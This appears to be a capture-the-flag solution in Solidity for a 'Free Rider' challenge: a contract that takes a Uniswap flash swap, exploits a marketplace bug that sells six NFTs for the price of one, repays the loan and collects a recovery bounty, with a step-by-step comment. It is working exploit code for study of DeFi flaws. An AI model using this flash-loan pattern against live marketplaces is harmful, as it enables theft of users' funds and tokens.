// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRider {

    IUniswapV2Pair private immutable pair;
    IMarketplace private immutable marketplace;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable recoveryContract;
    address private immutable player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract){
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft); 
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
        bytes memory data = abi.encode(NFT_PRICE);
        pair.swap(NFT_PRICE, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {  // callback function for swap function in pair contract
        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15WETH + 0.3% to the pair contract
        // this fee amount is paid from player 0.1 eth
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        // we deposit native ETH and get WETH to pay back to pair contract
        weth.transfer(address(pair), amountToPayBack);
 
        // 5. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
            // when ever we call safeTransferFrom we call the onERC721Received as call back function to transfer token
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}

/**
 * Process pf attack
 * 1) First we flash swap with 15 WETH from uniswap pair contract.
 * 2) Convert the WETH to native eth.
 * 3) Buy the NFTs from FreeRiderMarketplace, where there is bug that it takes only 15 eth for all NFTs.
 * 4) We have 0.5 native eth, with that we convert native eth to WETH with fees.
 * 5) After that we repay the WETH in that flash swap with fee.
 * 6) After buying all 6 NFTs with only 15 eth, we sent all the tokens to FreeRiderRecovery we get the Bounty of 
      45 eth
 
 * NOTE : when we do a swap in uniswap there is a fallback function(uniswapV2Call) is called.
 * NOTE : After receiving a NFT the onERC721Received fallback is calles, here we have to return the fallback 
          selector.
 */